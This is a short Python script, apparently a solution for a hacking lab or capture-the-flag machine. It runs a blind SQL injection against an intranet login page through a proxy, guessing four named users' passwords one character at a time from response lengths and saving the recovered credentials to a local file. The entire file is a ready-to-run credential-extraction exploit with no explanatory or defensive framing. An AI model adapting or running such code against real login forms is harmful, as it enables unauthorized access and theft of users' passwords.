#!/usr/bin/python3

import requests
import string

chars = 'abcdefghijklmnopqrstuvwxyz0123456789{}_()!@'

url = 'http://172.31.179.1/intranet.php'
proxies = {
  'http': 'http://10.10.10.200:3128',
}

usernames = ['bryan', 'rita', 'jim', 'sarah']

file = open('./passwords.txt', 'w')

for user in usernames:
  password = ''
  data = {
    'Username': '',
    'Password': f"'or Username='{user}' and substring(Password, 1, 1)='a"
  }
  invalid = len(requests.post(url, data=data, proxies=proxies).text)
  for i in range(1, 30):
    found = False
    for j in range(len(chars)):
      data = {
        'Username': '',
        'Password': f"'or Username='{user}' and substring(Password, 1, {i})='{password}{chars[j]}"
      }
      if len(requests.post(url, data=data, proxies=proxies).text) != invalid:
        password += chars[j]
        found = True
        break
    if not found:
      break
  
  print(f"User: {user}, Password: {password}")
  file.write(f"{user}:{password}\n")

print("[+] Done. See file ./password.txt")

